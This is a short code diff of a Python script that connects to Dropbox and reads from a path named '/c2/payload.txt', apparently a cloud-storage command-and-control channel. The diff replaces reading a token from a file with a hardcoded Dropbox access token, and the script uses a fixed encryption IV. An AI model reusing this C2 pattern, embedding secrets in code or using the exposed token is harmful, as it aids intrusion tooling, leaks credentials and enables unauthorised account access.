@@ -47,8 +47,10 @@ if __name__ == '__main__':
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
     # dropbox init
-    with open("token.txt", "r") as f:
-        token = f.read()
+    # with open("token.txt", "r") as f:
+    #     token = f.read()
+
+    token = "sl.BzeK72Mpf5vXSc_vEDUBjC-9597AgViP3MghTc71ych10QOWcG5oAgM2AiHa4UOiFyUFwzgx7OaLfRz0r4YTXVuHu1yTGiK_pdGZK5YRO5SagCv0qnKJodFury1npzFcG2-RycPCeJKfTUOuT8BP"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
